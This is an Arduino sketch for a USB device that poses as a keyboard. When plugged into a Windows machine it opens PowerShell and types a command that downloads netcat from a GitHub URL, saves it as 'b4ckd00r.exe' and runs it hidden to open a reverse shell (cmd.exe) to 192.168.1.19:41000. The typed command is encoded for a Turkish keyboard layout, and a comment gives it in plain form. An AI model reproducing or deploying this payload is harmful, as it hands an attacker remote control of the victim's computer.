#include<Keyboard.h>
void KeyPressUp(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);  
}

void setup() {
//Keyboard stream now.
Keyboard.begin();

delay(500);

Keyboard.press(KEY_LEFT_GUI);
Keyboard.press('r');
Keyboard.releaseAll();//GUI + r(RUN)

delay(500);

Keyboard.print("powershell");
KeyPressUp(KEY_RETURN);

delay(500);

Keyboard.print("*new=object System/Net/WebClüent(/DownloadFüle*½https?&&raw/güthubusercontent/com&s0l0n3t&netcat1221&master&nc/exe½¹½b4ckd00r/exe½(| StartöProcess ½b4ckd00r/exe½ =WündowStyle Hüdden =ArgumentLüst @192/168/1/19@¹@41000@¹@=e cmd/exe@");
KeyPressUp(KEY_RETURN);

delay(500);

Keyboard.print("exüt");
KeyPressUp(KEY_RETURN);
//Download link (netcat) https://raw.githubusercontent.com/s0l0n3t/netcat1221/master/nc.exe
//(new-object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/s0l0n3t/netcat1221/master/nc.exe','boe1.exe'); Start-Process "boe1.exe" -WindowStyle Hidden -ArgumentList '192.168.1.19','41000','-e cmd.exe'


//Keyboard.print("!'^+%&/()=?_*-][{½$#£><ß.,:;qwertyuıopüasdfghjklşizxcvbnmöç");
//                !i&_%/.)=-:?(*üğĞ"+^xÇÖtçöŞşqwertyuoptiasdfghjkltızxcvbnm-2
//Keyboard.print("qwertyuıopü,işlkjhgfdsa<zxcvbnmöç.");
//                qwertyuopiöıtlkjhgfdsaÖzxcvbnm-2ç
//Keyboard.print("rty<z.çm,işl{[]}}|");
//                rtyÖzç2möıtlĞğüÜÜ;
//Keyboard.print("¹º@");
//                ,,'

Keyboard.end();
}

void loop() {
  // put your main code here, to run repeatedly:

}
